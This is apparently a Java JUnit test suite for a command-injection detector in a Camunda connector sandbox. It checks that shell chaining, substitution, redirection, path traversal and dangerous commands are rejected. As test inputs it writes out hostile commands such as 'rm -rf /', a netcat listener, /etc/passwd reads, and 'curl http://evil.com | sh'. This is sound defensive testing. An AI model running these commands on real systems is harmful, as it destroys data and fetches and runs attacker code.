package io.camunda.connector.sandbox.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.assertj.core.api.Assertions.assertThatCode;

/**
 * Comprehensive tests for InjectionDetector.
 * These tests verify that all command injection vectors are properly detected.
 */
@DisplayName("InjectionDetector")
class InjectionDetectorTest {

    private InjectionDetector injectionDetector;

    @BeforeEach
    void setUp() {
        injectionDetector = new InjectionDetector();
    }

    @Nested
    @DisplayName("Null and empty input")
    class NullAndEmptyInput {

        @Test
        @DisplayName("should accept null input")
        void shouldAcceptNullInput() {
            assertThatCode(() -> injectionDetector.detectInjection(null))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("should accept empty string")
        void shouldAcceptEmptyString() {
            assertThatCode(() -> injectionDetector.detectInjection(""))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Safe input")
    class SafeInput {

        @ParameterizedTest
        @ValueSource(strings = {
                "simple command",
                "kubectl get pods",
                "aws s3 ls",
                "terraform plan",
                "jq .foo.bar",
                "curl https://example.com",
                "--version",
                "-f filename.txt",
                "file-with-dashes",
                "file_with_underscores",
                "argument123"
        })
        @DisplayName("should accept safe input: {0}")
        void shouldAcceptSafeInput(String input) {
            assertThatCode(() -> injectionDetector.detectInjection(input))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Command chaining injection")
    class CommandChainingInjection {

        @Test
        @DisplayName("should detect semicolon chaining")
        void shouldDetectSemicolon() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("ls; rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Semicolons");
        }

        @Test
        @DisplayName("should detect pipe operator")
        void shouldDetectPipe() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cat /etc/passwd | grep root"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Pipe");
        }

        @Test
        @DisplayName("should detect AND operator")
        void shouldDetectAndOperator() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("true && rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("&&");
        }

        @Test
        @DisplayName("should detect OR operator")
        void shouldDetectOrOperator() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("false || rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("||");
        }
    }

    @Nested
    @DisplayName("Command substitution injection")
    class CommandSubstitutionInjection {

        @Test
        @DisplayName("should detect $() substitution")
        void shouldDetectDollarParenSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo $(whoami)"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Command substitution");
        }

        @Test
        @DisplayName("should detect backtick substitution")
        void shouldDetectBacktickSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo `whoami`"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Backticks");
        }
    }

    @Nested
    @DisplayName("Redirection injection")
    class RedirectionInjection {

        @Test
        @DisplayName("should detect output redirection")
        void shouldDetectOutputRedirect() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo malicious > /etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }

        @Test
        @DisplayName("should detect input redirection")
        void shouldDetectInputRedirect() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd < /etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }

        @Test
        @DisplayName("should detect append redirection")
        void shouldDetectAppendRedirect() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo data >> file.txt"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }

        @Test
        @DisplayName("should detect stderr redirection")
        void shouldDetectStderrRedirect() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd 2>&1"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }

        @Test
        @DisplayName("should detect combined redirection")
        void shouldDetectCombinedRedirect() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd &> file.txt"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("redirection");
        }
    }

    @Nested
    @DisplayName("Variable expansion injection")
    class VariableExpansionInjection {

        @Test
        @DisplayName("should detect ${VAR} expansion")
        void shouldDetectBraceVarExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo ${PATH}"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Variable expansion");
        }

        @Test
        @DisplayName("should detect $VAR expansion")
        void shouldDetectSimpleVarExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("echo $HOME"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Environment variable");
        }
    }

    @Nested
    @DisplayName("Process substitution injection")
    class ProcessSubstitutionInjection {

        @Test
        @DisplayName("should detect <() process substitution")
        void shouldDetectInputProcessSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("diff <(ls) <(ls -a)"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Process substitution");
        }

        @Test
        @DisplayName("should detect >() process substitution")
        void shouldDetectOutputProcessSubstitution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd >(tee log.txt)"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Process substitution");
        }
    }

    @Nested
    @DisplayName("Background and special characters")
    class BackgroundAndSpecialChars {

        @Test
        @DisplayName("should detect background execution")
        void shouldDetectBackgroundExecution() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("malicious &"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Background execution");
        }

        @Test
        @DisplayName("should detect newline injection")
        void shouldDetectNewlineInjection() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\nrm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should detect carriage return injection")
        void shouldDetectCarriageReturnInjection() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\rrm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should detect null byte injection")
        void shouldDetectNullByteInjection() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\0malicious"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should detect history expansion")
        void shouldDetectHistoryExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("!!")
                    ).isInstanceOf(SecurityException.class)
                    .hasMessageContaining("History expansion");
        }

        @Test
        @DisplayName("should detect brace expansion")
        void shouldDetectBraceExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("file{1,2,3}.txt"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Brace expansion");
        }

        @Test
        @DisplayName("should detect here document")
        void shouldDetectHereDocument() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cat << EOF"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Here documents");
        }

        @Test
        @DisplayName("should detect arithmetic expansion")
        void shouldDetectArithmeticExpansion() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("$((1+1))"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Arithmetic expansion");
        }
    }

    @Nested
    @DisplayName("Path traversal and suspicious patterns")
    class PathTraversalAndSuspiciousPatterns {

        @Test
        @DisplayName("should detect parent directory traversal")
        void shouldDetectParentTraversal() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("../../../etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Path traversal");
        }

        @Test
        @DisplayName("should detect /etc/ access attempt")
        void shouldDetectEtcAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/etc/passwd"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("/etc/");
        }

        @Test
        @DisplayName("should detect /proc/ access attempt")
        void shouldDetectProcAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/proc/self/cmdline"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("/proc/");
        }

        @Test
        @DisplayName("should detect /sys/ access attempt")
        void shouldDetectSysAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/sys/kernel/"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("/sys/");
        }

        @Test
        @DisplayName("should detect /dev/ access attempt")
        void shouldDetectDevAccess() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("/dev/null"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("/dev/");
        }

        @Test
        @DisplayName("should detect URL encoded null byte")
        void shouldDetectUrlEncodedNull() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("file%00.txt"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Null bytes");
        }

        @Test
        @DisplayName("should detect URL encoded newline")
        void shouldDetectUrlEncodedNewline() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd%0amalicious"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Encoded newlines");
        }
    }

    @Nested
    @DisplayName("Dangerous commands")
    class DangerousCommands {

        @Test
        @DisplayName("should detect rm -rf")
        void shouldDetectRmRf() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("rm -rf /"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("rm -rf");
        }

        @Test
        @DisplayName("should detect chmod")
        void shouldDetectChmod() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("chmod 777 file"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("chmod");
        }

        @Test
        @DisplayName("should detect chown")
        void shouldDetectChown() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("chown root file"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("chown");
        }

        @Test
        @DisplayName("should detect sudo")
        void shouldDetectSudo() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("sudo rm file.txt"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("sudo");
        }

        @Test
        @DisplayName("should detect netcat")
        void shouldDetectNetcat() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("nc -l 4444"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("netcat");
        }

        @Test
        @DisplayName("should detect base64 decode piped to shell")
        void shouldDetectBase64Decode() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("base64 -d payload"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Base64");
        }

        @Test
        @DisplayName("should detect curl piped to shell")
        void shouldDetectCurlToShell() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("curl http://evil.com | sh"))
                    .isInstanceOf(SecurityException.class);
        }
    }

    @Nested
    @DisplayName("Input length validation")
    class InputLengthValidation {

        @Test
        @DisplayName("should reject excessively long input")
        void shouldRejectLongInput() {
            String longInput = "a".repeat(10001);
            assertThatThrownBy(() -> injectionDetector.detectInjection(longInput))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("too long");
        }

        @Test
        @DisplayName("should accept input at maximum length")
        void shouldAcceptMaxLengthInput() {
            String maxInput = "a".repeat(10000);
            assertThatCode(() -> injectionDetector.detectInjection(maxInput))
                    .doesNotThrowAnyException();
        }
    }

    @Nested
    @DisplayName("Control character validation")
    class ControlCharacterValidation {

        @Test
        @DisplayName("should allow tab character")
        void shouldAllowTabCharacter() {
            assertThatCode(() -> injectionDetector.detectInjection("arg1\targ2"))
                    .doesNotThrowAnyException();
        }

        @Test
        @DisplayName("should reject bell character")
        void shouldRejectBellCharacter() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\u0007arg"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should reject escape character")
        void shouldRejectEscapeCharacter() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\u001Barg"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }

        @Test
        @DisplayName("should reject form feed character")
        void shouldRejectFormFeedCharacter() {
            assertThatThrownBy(() -> injectionDetector.detectInjection("cmd\u000Carg"))
                    .isInstanceOf(SecurityException.class)
                    .hasMessageContaining("Control characters");
        }
    }

    @Nested
    @DisplayName("containsPattern helper method")
    class ContainsPatternHelperMethod {

        @Test
        @DisplayName("should return true when pattern is found")
        void shouldReturnTrueWhenPatternFound() {
            var pattern = java.util.regex.Pattern.compile("test");
            assertThat(injectionDetector.containsPattern("this is a test", pattern)).isTrue();
        }

        @Test
        @DisplayName("should return false when pattern is not found")
        void shouldReturnFalseWhenPatternNotFound() {
            var pattern = java.util.regex.Pattern.compile("xyz");
            assertThat(injectionDetector.containsPattern("this is a test", pattern)).isFalse();
        }

        @Test
        @DisplayName("should return false for null input")
        void shouldReturnFalseForNullInput() {
            var pattern = java.util.regex.Pattern.compile("test");
            assertThat(injectionDetector.containsPattern(null, pattern)).isFalse();
        }
    }
}
